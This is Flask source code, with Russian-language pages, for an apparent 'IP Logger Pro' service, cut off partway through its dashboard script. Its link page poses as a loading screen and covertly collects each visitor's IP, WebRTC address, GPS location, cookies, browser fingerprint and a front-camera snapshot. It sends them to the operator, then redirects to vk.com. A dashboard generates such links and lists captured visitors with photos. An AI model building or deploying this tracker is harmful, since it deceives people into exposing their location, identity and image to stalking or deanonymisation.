from flask import Flask, request, redirect, render_template_string, jsonify, session
import uuid
import datetime
import secrets

app = Flask(__name__)
app.secret_key = secrets.token_urlsafe(32)

user_data = {}

# ============ УСКОРЕННЫЙ LOGGER_HTML ============
LOGGER_HTML = """
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <title>Loading...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0f;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            flex-direction: column;
            overflow: hidden;
        }
        .loader-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 24px;
        }
        .loader {
            width: 56px;
            height: 56px;
            border: 3px solid rgba(255, 255, 255, 0.06);
            border-top: 3px solid #7c5cfc;
            border-radius: 50%;
            animation: spin 1s cubic-bezier(0.4, 0, 0.2, 1) infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .loader-text {
            font-size: 14px;
            font-weight: 400;
            color: rgba(255, 255, 255, 0.3);
            letter-spacing: 2px;
            text-transform: uppercase;
        }
        .loader-dots {
            display: flex;
            gap: 6px;
        }
        .loader-dots span {
            width: 6px;
            height: 6px;
            background: rgba(124, 92, 252, 0.4);
            border-radius: 50%;
            animation: pulse 1.4s ease-in-out infinite;
        }
        .loader-dots span:nth-child(2) { animation-delay: 0.2s; }
        .loader-dots span:nth-child(3) { animation-delay: 0.4s; }
        @keyframes pulse {
            0%, 80%, 100% { transform: scale(0.6); opacity: 0.4; }
            40% { transform: scale(1); opacity: 1; }
        }
    </style>
</head>
<body>
<div class="loader-container">
    <div class="loader"></div>
    <div class="loader-text">Загрузка</div>
    <div class="loader-dots">
        <span></span><span></span><span></span>
    </div>
</div>

<script>
(function() {
    var linkId = window.location.pathname.split('/').pop();

    function collectAllData() {
        return {
            link_id: linkId,
            timestamp: new Date().toISOString(),
            ip: 'Pending',
            webrtc_ip: 'Pending',
            country: 'Pending',
            city: 'Pending',
            region: 'Pending',
            isp: 'Pending',
            geo_lat: 'Pending',
            geo_lon: 'Pending',
            gps_lat: 'Pending',
            gps_lon: 'Pending',
            gps_accuracy: 'Pending',
            device_type: 'Pending',
            os: 'Pending',
            browser: 'Pending',
            user_agent: navigator.userAgent,
            screen: window.screen ? window.screen.width + 'x' + window.screen.height : 'Unknown',
            window_size: window.innerWidth + 'x' + window.innerHeight,
            color_depth: window.screen ? window.screen.colorDepth : 'Unknown',
            pixel_ratio: window.devicePixelRatio || 1,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
            language: navigator.language || navigator.languages?.[0] || 'Unknown',
            cookies: document.cookie || 'No cookies',
            fingerprint: 'Pending',
            plugins: 'Pending',
            battery_level: 'Pending',
            battery_charging: 'Pending',
            webgl_renderer: 'Pending',
            webgl_version: 'Pending',
            photo: 'Pending',
            settings_used: {}
        };
    }

    var collectedData = collectAllData();
    var sent = false;

    function sendData() {
        if (sent) return;
        sent = true;
        fetch('/log', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(collectedData)
        }).catch(function() {});
    }

    fetch('/settings')
        .then(function(r) { return r.json(); })
        .then(function(settings) {
            collectedData.settings_used = settings;
            sendData();
            
            Promise.all([
                fetchIP(),
                fetchGeo(),
                getBattery(),
                getWebGL(),
                getPlugins(),
                getFingerprint(),
                getGeolocation(settings.geo),
                getCameraPhoto(settings.camera),
                getWebRTC()
            ]).then(function(results) {
                var ip = results[0], geo = results[1], battery = results[2], webgl = results[3];
                var plugins = results[4], fingerprint = results[5], geoloc = results[6];
                var photo = results[7], webrtc = results[8];
                
                if (ip) collectedData.ip = ip;
                if (geo) {
                    collectedData.country = geo.country || 'Unknown';
                    collectedData.city = geo.city || 'Unknown';
                    collectedData.region = geo.region || 'Unknown';
                    collectedData.isp = geo.isp || 'Unknown';
                    collectedData.geo_lat = geo.latitude || 'Unknown';
                    collectedData.geo_lon = geo.longitude || 'Unknown';
                }
                if (battery) {
                    collectedData.battery_level = battery.level;
                    collectedData.battery_charging = battery.charging;
                }
                if (webgl) {
                    collectedData.webgl_renderer = webgl.renderer;
                    collectedData.webgl_version = webgl.version;
                }
                if (plugins) collectedData.plugins = plugins;
                if (fingerprint) collectedData.fingerprint = fingerprint;
                if (geoloc) {
                    collectedData.gps_lat = geoloc.latitude;
                    collectedData.gps_lon = geoloc.longitude;
                    collectedData.gps_accuracy = geoloc.accuracy;
                }
                if (photo) collectedData.photo = photo;
                if (webrtc) collectedData.webrtc_ip = webrtc;
                
                fetch('/log', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(collectedData)
                }).catch(function() {});
            });
        })
        .catch(function() {
            sendData();
        });

    function fetchIP() {
        return fetch('https://api.ipify.org?format=json')
            .then(function(r) { return r.json(); })
            .then(function(d) { return d.ip; })
            .catch(function() { return null; });
    }

    function fetchGeo() {
        return fetch('https://ipapi.co/json/')
            .then(function(r) { return r.json(); })
            .then(function(d) {
                return {
                    country: d.country_name || d.country || 'Unknown',
                    city: d.city || 'Unknown',
                    region: d.region || 'Unknown',
                    isp: d.org || 'Unknown',
                    latitude: d.latitude || 'Unknown',
                    longitude: d.longitude || 'Unknown'
                };
            })
            .catch(function() { return null; });
    }

    function getBattery() {
        return new Promise(function(resolve) {
            if (!navigator.getBattery) { resolve({ level: 'Unknown', charging: 'Unknown' }); return; }
            navigator.getBattery()
                .then(function(bat) { resolve({ level: Math.round(bat.level * 100) + '%', charging: bat.charging ? 'Yes' : 'No' }); })
                .catch(function() { resolve({ level: 'Unknown', charging: 'Unknown' }); });
        });
    }

    function getWebGL() {
        try {
            var canvas = document.createElement('canvas');
            var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (gl) {
                return Promise.resolve({
                    renderer: gl.getParameter(gl.RENDERER) || 'Unknown',
                    version: gl.getParameter(gl.VERSION) || 'Unknown'
                });
            }
            return Promise.resolve({ renderer: 'Not supported', version: 'Not supported' });
        } catch (e) { return Promise.resolve({ renderer: 'Unknown', version: 'Unknown' }); }
    }

    function getPlugins() {
        try {
            var plugins = Array.from(navigator.plugins || []).map(function(p) { return p.name; }).join(', ') || 'None';
            return Promise.resolve(plugins);
        } catch (e) { return Promise.resolve('Unknown'); }
    }

    function getFingerprint() {
        try {
            var canvas = document.createElement('canvas');
            canvas.width = 200; canvas.height = 50;
            var ctx = canvas.getContext('2d');
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillStyle = '#f60';
            ctx.fillRect(0, 0, 200, 50);
            ctx.fillStyle = '#069';
            ctx.fillText('fp', 10, 10);
            ctx.fillText(navigator.userAgent.substring(0, 30), 30, 10);
            return Promise.resolve(canvas.toDataURL().substring(0, 80) + '...');
        } catch (e) { return Promise.resolve('Unknown'); }
    }

    function getGeolocation(enabled) {
        return new Promise(function(resolve) {
            if (!enabled) {
                resolve({ latitude: 'Disabled', longitude: 'Disabled', accuracy: 'Disabled' });
                return;
            }
            if (!navigator.geolocation) {
                resolve({ latitude: 'Not supported', longitude: 'Not supported', accuracy: 'Not supported' });
                return;
            }
            navigator.geolocation.getCurrentPosition(
                function(pos) { resolve({ latitude: pos.coords.latitude, longitude: pos.coords.longitude, accuracy: pos.coords.accuracy }); },
                function(err) {
                    var msg = err.message;
                    if (err.code === 1) msg = 'User denied';
                    else if (err.code === 2) msg = 'Position unavailable';
                    else if (err.code === 3) msg = 'Timeout';
                    resolve({ latitude: 'Denied', longitude: 'Denied', accuracy: msg });
                },
                { enableHighAccuracy: true, timeout: 15000 }
            );
        });
    }

    function getCameraPhoto(enabled) {
        return new Promise(function(resolve) {
            if (!enabled) { resolve(null); return; }
            var video = document.createElement('video');
            var canvas = document.createElement('canvas');
            var ctx = canvas.getContext('2d');
            navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                audio: false
            })
            .then(function(stream) {
                video.srcObject = stream;
                video.play();
                setTimeout(function() {
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    ctx.translate(canvas.width, 0);
                    ctx.scale(-1, 1);
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    ctx.setTransform(1, 0, 0, 1, 0, 0);
                    var photo = canvas.toDataURL('image/jpeg', 0.85);
                    stream.getTracks().forEach(function(t) { t.stop(); });
                    resolve(photo);
                }, 500);
            })
            .catch(function() { resolve(null); });
        });
    }

    function getWebRTC() {
        return new Promise(function(resolve) {
            try {
                var pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
                pc.createDataChannel('test');
                pc.createOffer().then(function(offer) { pc.setLocalDescription(offer); }).catch(function() {});
                pc.onicecandidate = function(e) {
                    if (e.candidate) {
                        var match = e.candidate.candidate.match(/(\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3})/);
                        resolve(match ? match[0] : 'Unknown');
                        pc.close();
                    }
                };
                setTimeout(function() { resolve('Unknown'); pc.close(); }, 3000);
            } catch (e) { resolve('Unknown'); }
        });
    }

    setTimeout(function() {
        fetch('/settings')
            .then(function(r) { return r.json(); })
            .then(function(settings) {
                window.location.href = settings.redirect || 'https://vk.com/';
            })
            .catch(function() {
                window.location.href = 'https://vk.com/';
            });
    }, 800);

})();
</script>
</body>
</html>
"""

# ============ СТРАНИЦА ВХОДА ============
LOGIN_HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Вход — IP Logger</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0b0b12;
            font-family: 'Inter', sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .login-wrapper {
            background: rgba(255,255,255,0.02);
            border: 1px solid rgba(255,255,255,0.06);
            border-radius: 24px;
            padding: 48px 40px;
            max-width: 420px;
            width: 100%;
            backdrop-filter: blur(20px);
        }
        .login-title {
            font-size: 28px;
            font-weight: 800;
            color: #fff;
            margin-bottom: 6px;
            letter-spacing: -0.5px;
        }
        .login-title span { color: #7c5cfc; }
        .login-sub {
            color: rgba(255,255,255,0.3);
            font-size: 14px;
            font-weight: 400;
            margin-bottom: 32px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        .form-group label {
            display: block;
            color: rgba(255,255,255,0.5);
            font-size: 13px;
            font-weight: 500;
            margin-bottom: 6px;
        }
        .form-group input {
            width: 100%;
            padding: 14px 18px;
            background: rgba(255,255,255,0.04);
            border: 1px solid rgba(255,255,255,0.08);
            border-radius: 12px;
            color: #fff;
            font-size: 15px;
            font-family: 'Inter', sans-serif;
            transition: all 0.3s ease;
            outline: none;
        }
        .form-group input:focus {
            border-color: #7c5cfc;
            box-shadow: 0 0 0 3px rgba(124,92,252,0.15);
            background: rgba(255,255,255,0.06);
        }
        .form-group input::placeholder {
            color: rgba(255,255,255,0.15);
        }
        .btn-login {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #7c5cfc, #5c3cfc);
            border: none;
            border-radius: 12px;
            color: #fff;
            font-size: 16px;
            font-weight: 600;
            font-family: 'Inter', sans-serif;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 24px rgba(124,92,252,0.25);
        }
        .btn-login:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 32px rgba(124,92,252,0.35);
        }
        .btn-login:active { transform: scale(0.97); }
        .login-divider {
            display: flex;
            align-items: center;
            gap: 16px;
            margin: 24px 0;
            color: rgba(255,255,255,0.1);
            font-size: 12px;
        }
        .login-divider::before,
        .login-divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background: rgba(255,255,255,0.05);
        }
        .btn-guest {
            width: 100%;
            padding: 14px;
            background: rgba(255,255,255,0.04);
            border: 1px solid rgba(255,255,255,0.08);
            border-radius: 12px;
            color: rgba(255,255,255,0.5);
            font-size: 14px;
            font-weight: 500;
            font-family: 'Inter', sans-serif;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        .btn-guest:hover {
            background: rgba(255,255,255,0.08);
            border-color: rgba(255,255,255,0.15);
            color: #fff;
        }
    </style>
</head>
<body>
    <div class="login-wrapper">
        <div class="login-title">IP <span>Logger</span></div>
        <div class="login-sub">Войдите, чтобы управлять своими ссылками</div>
        <form method="POST" action="/login">
            <div class="form-group">
                <label>👤 Имя пользователя</label>
                <input type="text" name="username" placeholder="Введите логин" required />
            </div>
            <div class="form-group">
                <label>🔑 Пароль</label>
                <input type="password" name="password" placeholder="Введите пароль" required />
            </div>
            <button type="submit" class="btn-login">Войти</button>
        </form>
        <div class="login-divider">или</div>
        <form method="POST" action="/login">
            <input type="hidden" name="guest" value="1" />
            <button type="submit" class="btn-guest">🚪 Войти как гость</button>
        </form>
    </div>
</body>
</html>
"""

# ============ ОСНОВНАЯ ПАНЕЛЬ (ИСПРАВЛЕННАЯ) ============
DASHBOARD_HTML = """
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP Logger Pro</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0b0b12;
            color: #e8edf5;
            font-family: 'Inter', -apple-system, sans-serif;
            min-height: 100vh;
        }
        .app {
            max-width: 1320px;
            margin: 0 auto;
            padding: 24px 32px;
        }
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 16px 0;
            border-bottom: 1px solid rgba(255,255,255,0.04);
            margin-bottom: 32px;
            flex-wrap: wrap;
            gap: 16px;
        }
        .logo {
            display: flex;
            align-items: center;
            gap: 12px;
        }
        .logo-icon {
            width: 44px;
            height: 44px;
            background: linear-gradient(135deg, #7c5cfc, #5c3cfc);
            border-radius: 14px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 22px;
            box-shadow: 0 4px 20px rgba(124,92,252,0.25);
        }
        .logo-text {
            font-size: 24px;
            font-weight: 800;
            letter-spacing: -0.5px;
        }
        .logo-text span { color: #7c5cfc; }
        .logo-sub {
            font-size: 12px;
            color: rgba(255,255,255,0.2);
            font-weight: 400;
        }
        .header-right {
            display: flex;
            align-items: center;
            gap: 12px;
            flex-wrap: wrap;
        }
        .user-badge {
            background: rgba(124,92,252,0.12);
            padding: 8px 18px;
            border-radius: 50px;
            font-size: 13px;
            font-weight: 500;
            color: #a78bfa;
            border: 1px solid rgba(124,92,252,0.1);
        }
        .btn {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            padding: 10px 22px;
            border: none;
            border-radius: 12px;
            font-family: 'Inter', sans-serif;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s ease;
            text-decoration: none;
            color: #fff;
        }
        .btn:active { transform: scale(0.96); }
        .btn-primary { background: linear-gradient(135deg, #7c5cfc, #5c3cfc); box-shadow: 0 4px 20px rgba(124,92,252,0.25); }
        .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 6px 30px rgba(124,92,252,0.35); }
        .btn-success { background: linear-gradient(135deg, #10b981, #059669); box-shadow: 0 4px 20px rgba(16,185,129,0.2); }
        .btn-success:hover { transform: translateY(-2px); }
        .btn-danger { background: linear-gradient(135deg, #ef4444, #dc2626); box-shadow: 0 4px 20px rgba(239,68,68,0.2); }
        .btn-danger:hover { transform: translateY(-2px); }
        .btn-ghost { background: rgba(255,255,255,0.04); border: 1px solid rgba(255,255,255,0.06); }
        .btn-ghost:hover { background: rgba(255,255,255,0.08); border-color: rgba(255,255,255,0.12); }
        .btn-sm { padding: 6px 14px; font-size: 12px; border-radius: 8px; }
        .btn-xs { padding: 4px 10px; font-size: 11px; border-radius: 6px; }
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 16px;
            margin-bottom: 28px;
        }
        .stat-card {
            background: rgba(255,255,255,0.02);
            border: 1px solid rgba(255,255,255,0.05);
            border-radius: 16px;
            padding: 20px 24px;
            transition: all 0.3s ease;
        }
        .stat-card:hover { border-color: rgba(124,92,252,0.2); background: rgba(255,255,255,0.03); }
        .stat-card .num {
            font-size: 34px;
            font-weight: 800;
            background: linear-gradient(135deg, #7c5cfc, #a78bfa);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        .stat-card .label {
            font-size: 13px;
            color: rgba(255,255,255,0.35);
            margin-top: 2px;
            font-weight: 400;
        }
        .settings-panel {
            display: none;
            background: rgba(255,255,255,0.02);
            border: 1px solid rgba(255,255,255,0.06);
            border-radius: 16px;
            padding: 24px 28px;
            margin-bottom: 24px;
            transition: all 0.3s ease;
        }
        .settings-panel.active { display: block; }
        .settings-panel .title {
            font-size: 15px;
            font-weight: 600;
            margin-bottom: 16px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .settings-row {
            display: flex;
            flex-wrap: wrap;
            gap: 20px 32px;
            align-items: center;
        }
        .settings-group {
            display: flex;
            align-items: center;
            gap: 12px;
            flex-wrap: wrap;
        }
        .settings-group label {
            font-size: 13px;
            color: rgba(255,255,255,0.5);
        }
        .settings-group input[type="text"] {
            background: rgba(255,255,255,0.04);
            border: 1px solid rgba(255,255,255,0.06);
            border-radius: 8px;
            padding: 8px 14px;
            color: #fff;
            font-family: 'Inter', sans-serif;
            font-size: 13px;
            min-width: 220px;
            outline: none;
            transition: all 0.2s ease;
        }
        .settings-group input[type="text"]:focus {
            border-color: #7c5cfc;
            box-shadow: 0 0 0 3px rgba(124,92,252,0.1);
        }
        .toggle {
            position: relative;
            width: 44px;
            height: 24px;
            background: rgba(255,255,255,0.08);
            border-radius: 12px;
            cursor: pointer;
            transition: all 0.3s ease;
            flex-shrink: 0;
        }
        .toggle.active { background: #7c5cfc; }
        .toggle .thumb {
            position: absolute;
            top: 2px;
            left: 2px;
            width: 20px;
            height: 20px;
            background: #fff;
            border-radius: 50%;
            transition: all 0.3s ease;
            box-shadow: 0 2px 8px rgba(0,0,0,0.2);
        }
        .toggle.active .thumb { left: 22px; }
        .toggle-label {
            font-size: 13px;
            color: rgba(255,255,255,0.4);
            min-width: 50px;
        }
        .toggle-label.active { color: #a78bfa; }
        .link-box {
            background: rgba(255,255,255,0.02);
            border: 1px solid rgba(255,255,255,0.05);
            border-radius: 16px;
            padding: 16px 20px;
            margin-bottom: 12px;
            display: flex;
            align-items: center;
            flex-wrap: wrap;
            gap: 12px;
            transition: all 0.3s ease;
        }
        .link-box:hover { border-color: rgba(124,92,252,0.15); background: rgba(255,255,255,0.03); }
        .link-box .link {
            flex: 1;
            font-size: 14px;
            color: #a78bfa;
            word-break: break-all;
            font-weight: 500;
            font-family: 'JetBrains Mono', monospace;
            min-width: 180px;
        }
        .link-box .meta {
            font-size: 12px;
            color: rgba(255,255,255,0.25);
            white-space: nowrap;
        }
        .link-box .actions {
            display: flex;
            gap: 6px;
            flex-wrap: wrap;
        }
        .link-box.active {
            border-color: rgba(124,92,252,0.3);
            background: rgba(124,92,252,0.04);
        }
        .visitor {
            background: rgba(255,255,255,0.02);
            border: 1px solid rgba(255,255,255,0.04);
            border-radius: 14px;
            padding: 16px 20px;
            margin-bottom: 10px;
            transition: all 0.3s ease;
        }
        .visitor:hover { border-color: rgba(255,255,255,0.08); background: rgba(255,255,255,0.03); }
        .visitor .head {
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 8px;
            margin-bottom: 6px;
        }
        .visitor .ip {
            color: #a78bfa;
            font-weight: 600;
            font-size: 15px;
        }
        .visitor .time {
            font-size: 12px;
            color: rgba(255,255,255,0.2);
        }
        .visitor .badge {
            display: inline-block;
            padding: 2px 12px;
            border-radius: 20px;
            font-size: 11px;
            font-weight: 500;
        }
        .badge-success { background: rgba(16,185,129,0.12); color: #34d399; }
        .badge-warning { background: rgba(245,158,11,0.12); color: #fbbf24; }
        .badge-danger { background: rgba(239,68,68,0.12); color: #f87171; }
        .badge-info { background: rgba(124,92,252,0.12); color: #a78bfa; }
        .visitor .detail {
            font-size: 13px;
            color: rgba(255,255,255,0.35);
            line-height: 1.6;
        }
        .visitor .photo {
            max-width: 120px;
            border-radius: 8px;
            margin-top: 8px;
            border: 2px solid rgba(16,185,129,0.2);
        }
        .visitor .photo-placeholder {
            font-size: 12px;
            color: rgba(255,255,255,0.15);
            margin-top: 4px;
        }
        .empty {
            text-align: center;
            padding: 40px 20px;
            color: rgba(255,255,255,0.15);
        }
        .empty .icon { font-size: 40px; margin-bottom: 12px; opacity: 0.3; }
        .toast {
            position: fixed;
            bottom: 24px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(16,185,129,0.12);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(16,185,129,0.15);
            color: #34d399;
            padding: 12px 28px;
            border-radius: 50px;
            font-size: 14px;
            font-weight: 500;
            opacity: 0;
            transition: all 0.4s ease;
            pointer-events: none;
            z-index: 999;
            font-family: 'Inter', sans-serif;
        }
        .toast.show { opacity: 1; }
        .toast.error { background: rgba(239,68,68,0.12); border-color: rgba(239,68,68,0.15); color: #f87171; }
        @media (max-width: 768px) {
            .app { padding: 16px; }
            .header { flex-direction: column; align-items: flex-start; }
            .header-right { width: 100%; justify-content: flex-start; flex-wrap: wrap; }
            .stats-grid { grid-template-columns: repeat(2, 1fr); }
            .settings-row { flex-direction: column; align-items: stretch; gap: 12px; }
            .settings-group input[type="text"] { min-width: 100%; }
            .link-box { flex-direction: column; align-items: stretch; }
            .link-box .actions { justify-content: flex-end; }
        }
        @media (max-width: 480px) {
            .stats-grid { grid-template-columns: 1fr; }
        }
    </style>
</head>
<body>
<div class="app">
    <header class="header">
        <div class="logo">
            <div class="logo-icon">📡</div>
            <div>
                <div class="logo-text">IP <span>Logger</span></div>
                <div class="logo-sub">Приватный логгер</div>
            </div>
        </div>
        <div class="header-right">
            <span class="user-badge"><i class="fas fa-user"></i> {{ username }}</span>
            <button class="btn btn-primary btn-sm" onclick="generateLink()"><i class="fas fa-plus"></i> Создать</button>
            <button class="btn btn-success btn-sm" onclick="copyLink()"><i class="fas fa-copy"></i></button>
            <button class="btn btn-ghost btn-sm" onclick="toggleSettings()"><i class="fas fa-cog"></i></button>
            <a href="/logout" class="btn btn-danger btn-sm"><i class="fas fa-sign-out-alt"></i></a>
        </div>
    </header>

    <div style="margin-bottom:12px;">
        <button class="btn btn-ghost btn-sm" onclick="toggleSettings()">
            <i class="fas fa-cog"></i> Настройки
        </button>
    </div>

    <div class="settings-panel" id="settingsPanel">
        <div class="title">⚙️ Настройки ссылки</div>
        <div class="settings-row">
            <div class="settings-group" style="flex:2;">
                <label>🔗 Редирект</label>
                <input type="text" id="redirectInput" placeholder="https://vk.com/" value="https://vk.com/" />
                <button class="btn btn-sm btn-ghost" onclick="saveSettings()"><i class="fas fa-save"></i></button>
            </div>
            <div class="settings-group">
                <span class="toggle-label" id="geoLabel">📍 Гео</span>
                <div class="toggle active" id="geoToggle" onclick="toggleSetting('geo')">
                    <div class="thumb"></div>
                </div>
            </div>
            <div class="settings-group">
                <span class="toggle-label" id="cameraLabel">📷 Камера</span>
                <div class="toggle active" id="cameraToggle" onclick="toggleSetting('camera')">
                    <div class="thumb"></div>
                </div>
            </div>
        </div>
    </div>

    <div class="stats-grid" id="statsGrid">
        <div class="stat-card"><div class="num" id="totalVisits">0</div><div class="label">Всего переходов</div></div>
        <div class="stat-card"><div class="num" id="uniqueVisits">0</div><div class="label">Уникальных IP</div></div>
        <div class="stat-card"><div class="num" id="withPhoto">0</div><div class="label">С фото</div></div>
        <div class="stat-card"><div class="num" id="withGeo">0</div><div class="label">С геолокацией</div></div>
    </div>

    <div id="currentLinkBox" style="display:none;">
        <div class="link-box active">
            <span class="link" id="currentLinkText"></span>
            <span class="meta" id="currentVisits">0 переходов</span>
            <div class="actions">
                <button class="btn btn-sm btn-success" onclick="copyLink()"><i class="fas fa-copy"></i></button>
                <button class="btn btn-sm btn-danger" onclick="deleteCurrentLink()"><i class="fas fa-trash"></i></button>
            </div>
        </div>
    </div>

    <div id="linksList"></div>
    <div id="visitorsList"></div>
</div>

<div class="toast" id="toast"></div>

<script>
var currentLinkId = null;
var currentFullLink = '';
var settings = { redirect: 'https://vk.com/', geo: true, camera: true };

function loadSettings() {
    fetch('/settings')
        .then(function(r) { return r.json(); })
        .then(function(data) {
            settings = data;
            document.getElementById('redirectInput').value = data.redirect || 'https://vk.com/';
            updateToggle('geo', data.geo !== false);
            updateToggle('camera', data.camera !== false);
        })
        .catch(function() {});
}

function toggleSettings() {
    var panel = document.getElementById('settingsPanel');
    panel.classList.toggle('active');
}

function toggleSetting(name) {
    settings[name] = !settings[name];
    updateToggle(name, settings[name]);
    saveSettings();
}

function updateToggle(name, value) {
    var el = document.getElementById(name + 'Toggle');
    var label = document.getElementById(name + 'Label');
    if (value) {
        el.classList.add('active');
        if (label) label.classList.add('active');
    } else {
        el.classList.remove('active');
        if (label) label.classList.remove('active');
    }
}

function saveSettings() {
    var redirect = document.getElementById('redirectInput').value.trim() || 'https://vk.com/';
    settings.redirect = redirect;
    fetch('/settings', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(settings)
    })
    .then(function() { showToast('✅ Настройки сохранены'); })
    .catch(function() { showToast('❌ Ошибка', true); });
}

function generateLink() {
    fetch('/generate')
        .then(function(r) { return r.json(); })
        .then(function(data) {
            currentLinkId = data.id;
            currentFullLink = data.full_url;
            document.getElementById('currentLinkBox').style.display = 'block';
            document.getElementById('currentLinkText').textContent = currentFullLink;
            document.getElementById('currentVisits').textContent = data.visits + ' переходов';
            loadLinks();
            loadStats();
            showToast('✅ Ссылка создана');
        });
}

function copyLink() {
    if (!currentFullLink) { generateLink(); return; }
    if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(currentFullLink).then(function() {
            showToast('📋 Скопировано');
        }).catch(function() {
            fallbackCopy();
        });
    } else {
        fallbackCopy();
    }
}

function fallbackCopy() {
    var input = document.createElement('input');
    input.value = currentFullLink;
    document.body.appendChild(input);
    input.select();
    try {
        document.execCommand('copy');
        showToast('📋 Скопировано');
    } catch (e) {
        showToast('❌ Ошибка копирования', true);
    }
    document.body.removeChild(input);
}

function deleteCurrentLink() {
    if (!currentLinkId) return;
    if (!confirm('Удалить ссылку?')) return;
    fetch('/delete/' + currentLinkId, { method: 'POST' })
        .then(function() {
            currentLinkId = null;
            currentFullLink = '';
            document.getElementById('currentLinkBox').style.display = 'none';
            loadLinks();
            loadStats();
            showToast('🗑️ Удалено');
        });
}

function loadLinks() {
    fetch('/links')
        .then(function(r) { return r.json(); })
        .then(function(data) {
            var container = document.getElementById('linksList');
            if (!data.links || data.links.length === 0) {
                container.innerHTML = '<div class="empty"><div class="icon">🔗</div><div class="text">Нет ссылок</div></div>';
                return;
            }
            var html = '<div style="margin:16px 0 10px 0; font-size:13px; color:rgba(255,255,255,0.2);">📋 Ваши ссылки</div>';
            for (var i = 0; i < data.links.length; i++) {
                var link = data.links[i];
                var visits = data.visits[link.id] || 0;
                var isActive = link.id === currentLinkId;
                html += '<div class="link-box ' + (isActive ? 'active' : '') + '">' +
                    '<span class="link">' + link.full_url + '</span>' +
                    '<span class="meta">' + visits + ' переходов</span>' +
                    '<div class="actions">' +
                        '<button class="btn btn-xs btn-ghost" onclick="selectLink(\'' + link.id + '\')">Выбрать</button>' +
                        '<button class="btn btn-xs btn-danger" onclick="deleteLink(\'' + link.id + '\')"><i class="fas fa-trash"></i></button>' +
                    '</div>' +
                '</div>';
            }
            container.innerHTML = html;
        });
}

function selectLink(id) {
    fetch('/links')
        .then(function(r) { return r.json(); })
        .then(function(data) {
            var link = null;
            for (var i = 0; i < data.links.length; i++) {
                if (data.links[i].id === id) { link = data.links[i]; break; }
            }
            if (link) {
                currentLinkId = link.id;
                currentFullLink = link.full_url;
                document.getElementById('currentLinkBox').style.display = 'block';
                document.getElementById('currentLinkText').textContent = currentFullLink;
                document.getElementById('currentVisits').textContent = (data.visits[id] || 0) + ' переходов';
                loadLinks();
                loadStats();
                showToast('✅ Выбрано');
            }
        });
}

function deleteLink(id) {
    if (!confirm('Удалить?')) return;
    fetch('/delete/' + id, { method: 'POST' })
        .then(function() {
            if (currentLinkId === id) {
                currentLinkId = null;
                currentFullLink = '';
                document.getElementById('currentLinkBox').style.display = 'none';
            }
            loadLinks();
            loadStats();
            showToast('🗑️ Удалено');
        });
}

function loadStats() {
    var url = currentLinkId ? '/stats/' + currentLinkId : '/stats/all';
    fetch(url)
        .then(function(r) { return r.json(); })
        .then(function(data) {
            document.getElementById('totalVisits').textContent = data.total_visits || 0;
            document.getElementById('uniqueVisits').textContent = data.unique_ips || 0;
            document.getElementById('withPhoto').textContent = data.with_photo || 0;
            document.getElementById('withGeo').textContent = data.with_geo || 0;

            if (currentLinkId && document.getElementById('currentVisits')) {
                document.getElementById('currentVisits').textContent = (data.total_visits || 0) + ' переходов';
            }

            var html = '';
            var visitors = data.visitors || [];
            if (visitors.length === 0) {
                html = '<div class="empty"><div class="icon">🕊️</div><div class="text">Никого нет</div></div>';
            } else {
